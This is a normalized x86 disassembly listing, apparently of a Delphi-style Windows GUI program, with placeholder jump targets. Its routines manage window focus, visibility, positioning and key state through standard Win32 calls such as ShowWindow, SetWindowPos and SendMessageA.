je r-xdata
push 0x1
mov ecx [ edx + 0x4 ]
cmp ecx 0x1
sbb ecx ecx
neg ecx
mov edx [ eax + 0x220 ]
call sub_44fce8
retn
mov eax [ edx + 0x4 ]
push eax
call SetFocus
retn
sub_464858
push ebx
push esi
mov esi edx
mov ebx eax
xor edx edx
mov eax ebx
call sub_463e18
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_464874
push ebp
mov ebp esp
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
mov cl 0x1
mov eax ebx
call sub_45c238
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
xor ecx ecx
mov eax ebx
call sub_45c238
sub_4648b4
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x150 ] 0x1
jne r-xdata
cmp [ esi + 0x150 ] 0x0
jne r-xdata
cmp [ esi + 0x158 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
cmp [ esi + 0x154 ] 0x0
je r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x1
sub_4648ec
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x150 ] 0x1
jne r-xdata
mov [ edx ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x154 ]
call sub_4041b8
mov [ edx ] 0x1
mov eax [ ebx + 0x158 ]
mov [ ecx ] eax
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_464920
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_464a71
push [ fs : eax ]
mov [ fs : eax ] esp
test [ esi + 0x1c ] 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464a78
lea eax [ ebp - 0x10 ]
call sub_404164
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov [ ebp - 0x9 ] 0x1
push ebp
mov eax [ esi + 0x248 ]
call sub_464874
pop ecx
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ eax + 0xc ]
call sub_445e6c
mov ebx eax
jmp r-xdata
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_41723c
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax esi
call sub_448acc
lea eax [ ebp - 0x1c ]
call sub_406e5c
mov [ ebp - 0x14 ] eax
push ebp
mov eax [ esi + 0x7c ]
call sub_464874
pop ecx
mov [ ebp - 0x8 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_4648b4
test al al
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_468ffc
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx 0xd
mov eax [ rw-data ]
call sub_469064
mov ecx [ ebp - 0x8 ]
mov edx 0x8
mov eax [ rw-data ]
call sub_469064
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x9 ]
mov eax ebx
call sub_4648ec
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_41723c
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax ebx
call sub_448acc
lea eax [ ebp - 0x1c ]
call sub_406e5c
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov ebx [ ebx + 0x30 ]
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_468f94
test [ esi + 0x228 ] 0x8
je r-xdata
sub_464a80
push ebx
push esi
push ecx
mov [ esp ] edx
mov esi eax
test [ esi + 0x1c ] 0x2
jne r-xdata
mov edx [ esp ]
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edx
pop esi
pop ebx
retn
cmp [ esi + 0x22a ] 0x0
je r-xdata
mov edx [ esp ]
mov edx [ edx + 0x8 ]
mov eax [ esi + 0x74 ]
lea ecx [ edx + 0x18 ]
mov ebx [ eax + 0x14 ]
test ebx ebx
jbe r-xdata
mov ebx [ eax + 0x10 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea ecx [ edx + 0x20 ]
mov ebx [ eax + 0xc ]
test ebx ebx
jbe r-xdata
mov [ ecx + 0x4 ] ebx
mov ebx [ eax + 0x8 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea eax [ edx + 0x20 ]
push eax
lea eax [ edx + 0x24 ]
push eax
lea ecx [ edx + 0x1c ]
lea eax [ edx + 0x18 ]
mov edx eax
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov [ ecx + 0x4 ] ebx
sub_464af4
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx ]
add eax ecx
sub eax esi
cdq
xor eax edx
sub eax edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x2e4 ]
jge r-xdata
pop esi
pop ebx
pop ebp
retn
sub esi ecx
mov [ ebx ] esi
sub_464b20
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x2e2 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44dd50
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov esi [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_462b30
lea edx [ ebp - 0x14 ]
call sub_4662f8
push ebp
mov eax [ ebp - 0x4 ]
call sub_462b30
lea edx [ ebp - 0x24 ]
call sub_4662f8
mov ecx [ ebp - 0x24 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0x14 ]
call sub_464af4
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
call sub_462b30
lea edx [ ebp - 0x24 ]
call sub_4662f8
mov ecx [ ebp - 0x20 ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x10 ]
call sub_464af4
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_464af4
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4c ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x8 ]
call sub_464af4
pop ecx
cmp [ eax + 0xc ] 0x0
je r-xdata
sub_464bd8
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
or [ ebx + 0x2f4 ] 0x20
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_403564
pop esi
pop ebx
retn
sub_464bfc
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
and [ ebx + 0x2f4 ] 0xdf
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb1
call sub_403564
pop esi
pop ebx
retn
sub_464c20
push ebx
push esi
mov esi edx
mov ebx eax
push 0x12
call GetKeyState
test ax ax
jl r-xdata
mov edx esi
mov eax ebx
call sub_44ec30
mov ax [ esi + 0x4 ]
sub ax 0x9
je r-xdata
push 0x11
call GetKeyState
test ax ax
jl r-xdata
add eax 0xffffffe4
sub ax 0x4
jb r-xdata
push 0x1
push 0x10
call GetKeyState
test ax ax
setge cl
mov edx [ ebx + 0x220 ]
mov eax ebx
call sub_44fce8
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
mov dx [ esi + 0x4 ]
cmp dx 0x27
je r-xdata
mov cl 0x1
cmp dx 0x28
je r-xdata
xor ecx ecx
jmp r-xdata
mov edx [ eax + 0x30 ]
xchg edx eax
call sub_44fce8
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_464cbc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_465226
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
call sub_469448
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x4
xor edx edx
push ebp
push sub_465209
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465210
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
xor eax eax
push ebp
push sub_465110
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_403564
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push sub_464d74
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_403564
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_463e68
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44cd0c
jmp r-xdata
mov eax [ rw-data ]
call sub_466554
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4489b8
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_44f7b4
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call SetWindowPos
jmp r-xdata
mov eax [ rw-data ]
call sub_466548
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4489fc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call IsIconic
test eax eax
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_44f7b4
call sub_45fac4
mov ebx eax
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_466584
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4489b8
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_466554
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
push r-xdata
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_449214
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_466578
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4489fc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_466548
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_463118
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_463118
jmp r-xdata
sub_464d79
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_468b5c
call sub_403b98
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ rw-data ]
call sub_466554
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4489b8
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_466548
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4489fc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_466584
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4489b8
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_466554
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465210
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
push r-xdata
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_449214
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_466578
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4489fc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_466548
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_463118
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_463118
jmp r-xdata
sub_465115
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_468b5c
call sub_403b98
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_463e68
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44cd0c
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_44f7b4
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call SetWindowPos
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465210
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_44f7b4
call sub_45fac4
mov ebx eax
sub_46525c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
retn
mov eax [ rw-data ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
sub_4652b4
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
cmp [ esi + 0x59 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_424004
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_465312
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x68 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403368
retn
mov eax [ esi + 0x68 ]
mov edx [ edx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_465320
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
mov si 0xffab
call sub_403564
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_46534c
push ebx
push esi
push ecx
mov ebx eax
test [ ebx + 0x2f4 ] 0x8
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov [ ebx + 0x24c ] 0x2
jmp r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov [ esp ] 0x1
test [ ebx + 0x228 ] 0x2
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov [ esp ] 0x3
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_468b48
jmp r-xdata
mov edx esp
mov eax ebx
mov si 0xffb0
call sub_403564
cmp [ esp ] 0x0
je r-xdata
cmp [ esp ] 0x3
jne r-xdata
mov eax ebx
call sub_4654ec
jmp r-xdata
mov eax ebx
call sub_465588
mov dl 0x1
mov eax ebx
call sub_4630d8
jmp r-xdata
sub_4653f0
push ebx
push esi
push edi
push ecx
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x29a ] 0x0
je r-xdata
mov [ esp ] 0x0
mov eax ebx
call sub_462a64
mov esi eax
dec esi
test esi esi
jl r-xdata
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x29c ]
call [ ebx + 0x298 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_462ab0
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
sub_465454
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4654c0
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x5 ] 0x1
lea edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_403564
mov eax [ ebp - 0x4 ]
